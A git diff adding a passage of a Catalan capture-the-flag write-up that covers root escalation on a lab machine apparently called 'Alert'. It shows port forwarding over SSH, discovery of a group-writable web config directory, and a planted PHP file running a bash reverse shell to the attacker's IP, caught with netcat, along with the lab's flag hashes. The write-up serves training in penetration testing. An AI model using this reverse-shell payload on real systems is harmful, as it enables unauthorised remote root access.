@@ -561,7 +561,191 @@ albert@alert:~$ cat user.txt
 e469507ec129a8838c1c8ea336ca93e3
 ````
 
-Ara, haurem d'escalar privilegis per obtenir la flag de l'usuari root.
+Ara toca escalar privilegis per obtenir la flag de l'usuari root. Si remenem dins de la màquina víctima, veiem com hi ha dos usuaris, l'altre usuari es diu david però no tenim permisos per poder veure el seu home:
+
+```
+albert@alert:~$ cd ..
+albert@alert:/home$ ls
+albert  david
+albert@alert:/home$ cd david/
+-bash: cd: david/: Permission denied
+```
+
+Com a l'anterior màquina que vàrem fer, comprovarem si la màquina té algun port obert que no ens hagi detectat nmap i veiem que hi ha el port 8080 obert:
+
+
+```
+albert@alert:/home$ netstat -tpln
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -  
+``` 
+
+Sembla que també podrem reenviarnos el port, fer un port forwarding que ens permetrà accedir des del nostre navegador amb localhost al port 8080 de la màquina víctima:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh -L 8080:127.0.0.1:8080 albert@10.10.11.44
+
+albert@10.10.11.44's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat 07 Dec 2024 01:44:14 PM UTC
+
+  System load:  0.0               Processes:             236
+  Usage of /:   62.3% of 5.03GB   Users logged in:       1
+  Memory usage: 9%                IPv4 address for eth0: 10.10.11.44
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Dec  7 13:32:29 2024 from 10.10.14.192
+albert@alert:~$ 
+```
+
+I ara, podem anar al navegador amb la nostra màquina kali com a localhost i veure què s'està executant a aquest port i ens trobem amb un dashboard de monitorització web del domini alert.htb i el subdomini statistics.alert.htb:
+
+![[Pasted image 20241207144635.png]]
+
+Sembla que l'usuari albert ha de tenir permisos per fer alguna cosa que ens portarà a escalar privilegis, per tant, el primer que faig és mirar a quin grup està l'usuari albert, a veure si està dins algun grup en concret:
+
+```
+albert@alert:/$ groups
+albert management
+```
+
+Okey, sembla que potser podrem trobar algun fitxer que pot executar el grup management, segurament relacionat amb el website monitor que acabem de trobar. 
+
+Després d'estar mirant permisos als fitxers i directoris de la màquina durant força estona, anant fent ls -la, he vist que hi ha un fitxer on hi té permisos el grup d'usuaris management al qual hi ha l'albert:
+
+```
+albert@alert:/$ cd /opt
+albert@alert:/opt$ ls
+google  website-monitor
+albert@alert:/opt$ ls -la
+total 16
+drwxr-xr-x  4 root root 4096 Oct 12 00:58 .
+drwxr-xr-x 18 root root 4096 Nov 14 10:55 ..
+drwxr-xr-x  3 root root 4096 Mar  8  2024 google
+drwxrwxr-x  7 root root 4096 Oct 12 01:07 website-monitor
+albert@alert:/opt$ cd website-monitor/
+albert@alert:/opt/website-monitor$ ls -la
+total 96
+drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
+drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
+drwxrwxr-x 2 root management  4096 Dec  7 13:50 config
+drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
+drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
+-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
+-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
+-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
+drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
+-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
+-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
+-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
+-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
+drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates
+albert@alert:/opt/website-monitor$ cd config
+albert@alert:/opt/website-monitor/config$ ls -la
+total 12
+drwxrwxr-x 2 root management 4096 Dec  7 13:50 .
+drwxrwxr-x 7 root root       4096 Oct 12 01:07 ..
+-rwxrwxr-x 1 root management   49 Dec  7 13:56 configuration.php
+```
+
+Al tenir permisos dins del directori /opt/website-monitor/config/ i veure que aquí dins hi ha un script anomenat configuration.php, sembla molt clar que haurem de crear un script aquí amb php que ens obri una reverse shell ja que hi tenim permisos de escriptura i execució i al obrir la shell des d'aquest directori on el grup management hi té permisos root ja que n'és propietari podrem obtenir permisos amb l'usuari root, és a dir, com que el fitxer s'executa amb privilegis de root per el grup management, obtenim una connexió remota i reverse shell com a com a usuari root. Per fer he fet el següent:
+
+Posem l'script amb la reverse shell al directori config a l'script amb php:
+
+```
+albert@alert:/opt/website-monitor/config$ ls
+configuration.php  revshell_pol.php
+```
+
+
+```
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.192/4444 0>&1'");
+?>
+```
+
+Tornem a comprovar permisos i efectivament ja podem executar l'script al ser del grup management:
+
+```
+albert@alert:/opt/website-monitor/config$ ls -la
+total 16
+drwxrwxr-x 2 root   management 4096 Dec  7 16:18 .
+drwxrwxr-x 7 root   root       4096 Oct 12 01:07 ..
+-rwxrwxr-x 1 root   management   49 Dec  7 16:18 configuration.php
+-rwxrwxr-x 1 albert management   76 Dec  7 16:18 revshell_pol.php
+```
+
+Ara obrim el port per escoltar des de la nostre màquina kali:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+
+listening on [any] 4444 ...
+```
+
+I ara ja podem anar a localhost al port 8080 executant el fitxer per obtenir la reverse shell amb privilegis root:
+
+Anem al navegador a: http://127.0.0.1:8080/config/revshell_pol.php (/config/revshell_pol.php perquè es troba dins el directori website-monitor que és el de la web):
+
+![[Pasted image 20241207172219.png]]
+
+I ja podem veure i aconseguir la flag de root:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.14.192] from (UNKNOWN) [10.10.11.44] 34398
+bash: cannot set terminal process group (1014): Inappropriate ioctl for device
+bash: no job control in this shell
+root@alert:/opt/website-monitor/config# whoami
+whoami
+root
+root@alert:/opt/website-monitor/config# cd
+cd
+root@alert:~# ls        
+ls
+root.txt
+scripts
+root@alert:~# cat root.txt
+cat root.txt
+ad1ee98c2c649c4e5a31e12c64490785
+root@alert:~# 
+```
+
+![[Pasted image 20241207172932.png]]
+
+
+
 
 
 
